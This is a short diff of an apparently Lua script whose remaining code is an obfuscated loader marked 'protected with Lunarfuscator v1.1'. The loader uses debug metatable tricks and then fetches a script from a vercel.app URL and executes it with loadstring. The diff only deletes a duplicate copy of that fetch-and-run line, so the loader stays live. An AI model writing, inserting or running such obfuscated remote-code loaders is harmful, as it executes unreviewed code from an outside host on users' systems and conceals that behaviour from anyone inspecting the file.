@@ -18,7 +18,3 @@
 ]])
 
 {([[This file was protected with Lunarfuscator v1.1]]):gsub('.+', (function(a) _QcPlYpdhBnGY7 = a; end)); (function(b)local c=debug.getmetatable(b)debug.setmetatable(b,{__call=function(d,e)debug.setmetatable(b,c)return function(b)b{'a',d}end end})end)''}return loadstring(request({Url="https://lunar-rest-api.vercel.app/script/xd",Method="GET"}).Body)()
-
-
-
-return loadstring(request({Url="https://lunar-rest-api.vercel.app/script/xd",Method="GET"}).Body)()
